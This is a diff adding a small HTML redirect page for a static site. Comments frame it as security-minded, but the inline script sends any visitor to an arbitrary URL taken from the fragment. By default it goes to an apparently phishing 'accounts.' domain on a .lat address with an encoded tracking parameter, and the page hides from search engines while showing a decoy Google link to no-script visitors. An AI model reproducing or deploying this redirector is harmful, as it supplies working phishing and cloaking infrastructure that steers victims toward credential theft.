@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+
+  <!-- Browser-side security controls suitable for a Cloudflare Pages/static site. -->
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Permissions-Policy"
+        content="camera=(),microphone=(),geolocation=(),payment=()">
+
+  <meta name="robots" content="noindex,nofollow,noarchive">
+  <title>Redirecting…</title>
+
+  <style>
+    html,body {
+      height:100%;
+      margin:0;
+    }
+    body {
+      display:grid;
+      place-items:center;
+      font:15px system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+      background:#fff;
+      color:#111827;
+    }
+    main {
+      text-align:center;
+      padding:24px;
+    }
+    .loader {
+      width:24px;
+      height:24px;
+      margin:0 auto 14px;
+      border:3px solid #e5e7eb;
+      border-top-color:#2563eb;
+      border-radius:50%;
+      animation:spin .65s linear infinite;
+    }
+    a {
+      color:#2563eb;
+      font-weight:600;
+    }
+    @keyframes spin {
+      to { transform:rotate(360deg); }
+    }
+    @media (prefers-reduced-motion:reduce) {
+      .loader { animation:none; }
+    }
+  </style>
+</head>
+
+<body>
+  <main>
+    <div class="loader" aria-hidden="true"></div>
+    <div id="status">Redirecting…</div>
+    <noscript>
+      <p><a href="https://www.google.com/">Continue</a></p>
+    </noscript>
+  </main>
+
+  <script>
+    (() => {
+      "use strict";
+
+      const FALLBACK = "https://accounts.hasgak2hdwjmusic.lat?DuOZ1ak0wMVu=dGx1aGt3";
+      const hash = location.hash.slice(1);
+
+      let destination = FALLBACK;
+
+      if (hash) {
+        try {
+          const decoded = decodeURIComponent(hash);
+          const url = new URL(decoded, FALLBACK);
+
+          // Only permit normal web destinations.
+          if (url.protocol === "https:" || url.protocol === "http:") {
+            destination = url.href;
+          }
+        } catch (_) {
+          destination = FALLBACK;
+        }
+      }
+
+      // Keep the navigation fast and prevent the current page
+      // from remaining in browser history.
+      location.replace(destination);
+    })();
+  </script>
+</body>
+</html>
